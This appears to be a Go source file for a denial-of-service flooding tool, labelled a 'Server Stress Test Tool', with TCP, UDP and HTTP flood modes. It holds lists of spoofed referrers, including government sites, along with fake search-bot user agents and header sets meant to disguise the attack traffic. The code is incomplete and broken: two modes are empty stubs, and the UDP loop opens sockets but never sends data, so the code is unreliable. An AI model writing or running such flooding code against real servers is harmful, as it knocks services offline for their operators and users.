package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

var (
	referrers = []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.yahoo.com/",
		"https://www.bing.com/",
		"http://www.bing.com/search?q=",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://www.police.gov.hk/",
		"https://www.mjib.gov.tw/",
		"https://www.president.gov.tw/",
		"https://www.gov.hk",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}

	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
		"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)",
		"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
	}

	headers = map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache",
		"Connection":      "keep-alive",
		"Upgrade-Insecure-Requests": "1",
	}

	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, /;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,/;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, ;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, /\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, /\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, /;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, /;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, ;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, ;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,/;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	}

	spiderUserAgents = []string{
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
		"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)",
		"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
		"Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
		"Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
		"Mozilla/5.0 (compatible; rogerBot/1.0; UrlCrawler; http://www.seomoz.org/dp/rogerbot)",
		"Mozilla/5.0 (compatible; seoscanners.net/1; +spider@seoscanners.net)",
		"Mozilla/5.0 (compatible; spbot/5.0.3; +http://OpenLinkProfiler.org/bot)",
	}

	str       = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM=&"
	succ      = 0
	fail      = 0
	start     = make(chan bool)
)

func main() {
	fmt.Println("|--------------------------------------|")
	fmt.Println("|   Golang : Server Stress Test Tool   |")
	fmt.Println("|             C0d3d By SAMEER           |")
	fmt.Println("|--------------------------------------|")

	if len(os.Args) != 7 {
		fmt.Printf("Usage: %s host port mode connections seconds timeout(second)\r\n", os.Args[0])
		fmt.Println("|--------------------------------------|")
		fmt.Println("|             Mode List                |")
		fmt.Println("|     [1] TCP-Connection flood         |")
		fmt.Println("|     [2] UDP-flood                    |")
		fmt.Println("|     [3] HTTP-flood(Auto SSL)         |")
		fmt.Println("|--------------------------------------|")
		os.Exit(1)
	}

	mode := os.Args[3]
	host := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("port should be an integer")
		os.Exit(1)
	}

	connections, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("connections should be an integer")
		os.Exit(1)
	}

	seconds, err := strconv.Atoi(os.Args[5])
	if err != nil {
		fmt.Println("seconds should be an integer")
		os.Exit(1)
	}

	timeout, err := strconv.Atoi(os.Args[6])
	if err != nil {
		fmt.Println("timeout should be an integer")
		os.Exit(1)
	}

	switch mode {
	case "1":
		// TCP connection flood
		startTCPFlood(host, port, connections, seconds, timeout)
	case "2":
		// UDP flood
		startUDPFlood(host, port, connections, seconds, timeout)
	case "3":
		// HTTP flood (Auto SSL)
		startHTTPFlood(host, port, connections, seconds, timeout)
	default:
		fmt.Println("Invalid mode selected.")
		os.Exit(1)
	}
}

func startTCPFlood(host string, port, connections, seconds, timeout int) {
	// Implement TCP flood
}

func startUDPFlood(host string, port, connections, seconds, timeout int) {
	count := 0
	stop := make(chan bool)

	// Start the specified number of connections
	for i := 0; i < connections; i++ {
		go func() {
			defer func() {
				stop <- true
			}()

			for {
				select {
				case <-stop:
					return
				default:
					// Attempt to send UDP packets
					conn, err := net.DialTimeout("udp", fmt.Sprintf("%s:%d", host, port), time.Duration(timeout)*time.Second)
					if err != nil {
						continue
					}
					defer conn.Close()
					count++
				}
			}
		}()
	}

	// Wait for the specified duration
	time.Sleep(time.Duration(seconds) * time.Second)

	// Print statistics
	fmt.Println("Total Sent:", count, "packets")
}


func startHTTPFlood(host string, port, connections, seconds, timeout int) {
	// Implement HTTP flood (Auto SSL)
}
